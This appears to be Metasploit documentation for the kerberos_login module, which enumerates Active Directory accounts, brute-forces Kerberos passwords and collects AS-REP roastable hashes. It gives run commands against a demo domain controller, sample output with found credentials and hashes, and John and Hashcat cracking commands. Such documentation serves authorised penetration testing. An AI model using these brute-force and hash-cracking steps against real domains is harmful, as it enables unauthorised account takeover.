## Kerberos Login/Bruteforce

The `auxiliary/scanner/kerberos/kerberos_login` module can verify Kerberos credentials against a range of machines and
report successful logins. If you have loaded a database plugin
and connected to a database this module will record successful
logins and hosts so you can track your access. It will also
store kerberos tickets that can be used even after the user's
password has been changed.

Kerberos accounts which do not require pre-authentication will
have the TGT logged for offline cracking, this technique is known as AS-REP Roasting.

This module is able to identify the following information from the KDC: 

- Valid/Invalid accounts
- Locked/Disabled accounts
- Accounts with expired passwords, when the password matches
- AS-REP Roastable accounts

## Target

To use the `kerberos_login` module, make sure you are able to connect to the
Kerberos service on a Domain Controller.

## Scenarios

### Creating a single Kerberos ticket (TGT)

To create a single Kerberos ticket (TGT), set the username and password options:

```msf
msf6 auxiliary(scanner/kerberos/kerberos_login) > run rhost=192.168.123.133 domain=DEMO.local username=basic_user password=password verbose=true
[*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
[+] 192.168.123.133 - User found: "basic_user" with password password
[*] Auxiliary module execution completed
```

### Auth Brute

The following demonstrates basic usage, using a custom wordlist,
targeting a single Domain Controller to identify valid domain user
accounts and additionally bruteforcing passwords:

Create a new `./users.txt` file and `./wordlist.txt`, then run the module:

```msf
msf6 auxiliary(gather/kerberos_enumusers) > run rhost=192.168.123.133 domain=DEMO.local user_file=./users.txt pass_file=./wordlist.txt verbose=true
[*] Using domain: DEMO.LOCAL - 192.168.123.133:88   ...
[+] 192.168.123.133 - User: "basic_user" is present
[*] 192.168.123.133 - User: "basic_user" wrong password invalid2
[*] 192.168.123.133 - User: "basic_user" wrong password p4$$w0rd
[*] 192.168.123.133 - User: "basic_user" wrong password test_password
[+] 192.168.123.133 - User found: "basic_user" with password password. Hash: $krb5asrep$23$basic_user@DEMO.LOCAL:959b983f9cffc093002d9cd8a20...etc...
[*] 192.168.123.133 - User: "foo" user not found
[*] 192.168.123.133 - User: "foo_bar" user not found
[+] 192.168.123.133 - User: "Administrator" is present
[*] 192.168.123.133 - User: "Administrator" wrong password invalid2
[*] 192.168.123.133 - User: "Administrator" wrong password p4$$w0rd
[*] 192.168.123.133 - User: "Administrator" wrong password test_password
[*] 192.168.123.133 - User: "Administrator" wrong password password
[+] 192.168.123.133 - User: "no_pre_auth" does not require preauthentication. Hash: $krb5asrep$23$no_pre_auth@DEMO.LOCAL:a714f0553589cbd78...etc...
[+] 192.168.123.133 - User: "admin" is present
[*] 192.168.123.133 - User: "admin" wrong password invalid2
[*] 192.168.123.133 - User: "admin" - Kerberos Error - KDC_ERR_KEY_EXPIRED (23) - Password has expired - change password to reset
[*] 192.168.123.133 - User: "admin" wrong password test_password
[*] 192.168.123.133 - User: "admin" wrong password password
[*] Auxiliary module execution completed
```

### ASREPRoasting

Accounts that have `Do not require Kerberos preauthentication` enabled, will receive an ASREP response with a ticket-granting-ticket present.
The technique of cracking this ticket offline is called ASREPRoasting.

Cracking ASREP response with John:

```
john ./hashes.txt --wordlist=./wordlist.txt --format:krb5asrep
```

Cracking ASREP response with Hashcat:

```
hashcat -m 18200 -a 0 ./hashes.txt ./wordlist.txt
```

You can see previously cracked creds with:

```
creds -v
```

## Options

The `kerberos_login` module only requires the `RHOST`, `DOMAIN` and
`USER_FILE` options to run.

**The DOMAIN option**

This option is used to specify the target domain. If the domain name is
incorrect an error is returned and domain user account enumeration will fail.

An example of setting DOMAIN:

```
set DOMAIN [domain name]
```

**The USER_FILE option**

This option is used to specify the file containing a list of user names
to query the Domain Controller to identify if they exist in the target domain
or not. One per line.

An example of setting USER_FILE:

```
set USER_FILE [path to file]
```

**The PASS_FILE option**

If you happen to manage all the found passwords in a separate file, then this option would be
suitable for that. One per line.

```
set PASS_FILE [path to file]
```

**The USERPASS_FILE option**

If each user should be using a specific password in your file, then you can use this option. One
username/password per line:

```
set USERPASS_FILE [path to file]
```

**The DB_ALL_CREDS option**

This option allows you to reuse all the user names and passwords collected by the database:

```
set DB_ALL_CREDS true
```

**The DB_ALL_PASS option**

This option allows you to reuse all the passwords collected by the database.

```
set DB_ALL_PASS true
```

**The DB_ALL_USERS option**

This option allows you to reuse all the user names collected by the database.

```
set DB_ALL_USERS true
```

**The Timeout option**

This option is used to specify the TCP timeout i.e. the time to wait
before a connection to the Domain Controller is established and data read.

An example of setting Timeout:

```
set Timeout [value in seconds]
```
